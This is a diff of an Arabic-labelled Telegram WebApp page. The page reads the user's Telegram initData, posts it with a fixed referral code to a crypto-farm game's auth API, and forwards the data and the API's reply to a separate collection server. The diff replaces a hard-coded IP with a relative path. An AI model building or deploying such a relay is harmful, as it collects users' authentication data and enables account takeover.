@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>عرض بيانات Telegram WebApp</title>
@@ -24,15 +23,10 @@
     }
   </style>
 </head>
-<body>
-
-  <h2>Telegram WebApp initData:</h2>
+<body>  <h2>Telegram WebApp initData:</h2>
   <pre id="output">جارٍ التحميل...</pre>
   <pre id="response">جارٍ الإرسال...</pre>
-  <button onclick="sendToServer()">إرسال البيانات إلى السيرفر</button>
-
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script>
+  <button onclick="sendToServer()">إرسال البيانات إلى السيرفر</button>  <script src="https://telegram.org/js/telegram-web-app.js"></script>  <script>
     const initData = Telegram.WebApp.initData || "لا يوجد initData";
     document.getElementById("output").textContent = initData;
 
@@ -46,7 +40,6 @@
         referral_code: "5343064159"
       };
 
-      // إرسال إلى API الخارجية
       fetch('https://fruitcryptofarm.xyz/api/auth/telegram', {
         method: 'POST',
         headers: headers,
@@ -54,8 +47,7 @@
       })
       .then(res => res.text())
       .then(apiResponse => {
-        // إرسال initData والرد إلى السيرفر الخاص بك
-        fetch('http://108.181.171.179:5000/id', {
+        fetch('/id', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -77,7 +69,5 @@
         document.getElementById("response").textContent = "❌ خطأ في API الخارجية: " + err;
       });
     }
-  </script>
-
-</body>
+  </script></body>
 </html>
